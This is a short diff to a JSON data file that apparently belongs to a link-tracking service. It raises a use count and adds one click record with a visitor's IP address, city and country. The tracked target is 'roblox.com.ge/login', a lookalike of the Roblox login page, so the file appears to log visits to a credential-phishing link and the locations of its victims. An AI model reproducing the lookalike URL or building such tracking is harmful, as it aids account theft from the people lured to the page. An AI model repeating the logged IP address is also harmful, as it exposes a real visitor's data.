@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1152,
+    "useCount": 1153,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9360,6 +9360,14 @@
         "city": "Khlong Luang",
         "flag": "🇹🇭",
         "countryCode": "TH"
+      },
+      {
+        "timestamp": 1777283585559,
+        "ip": "178.161.123.102",
+        "country": "Kuwait",
+        "city": "Kuwait City",
+        "flag": "🇰🇼",
+        "countryCode": "KW"
       }
     ]
   },
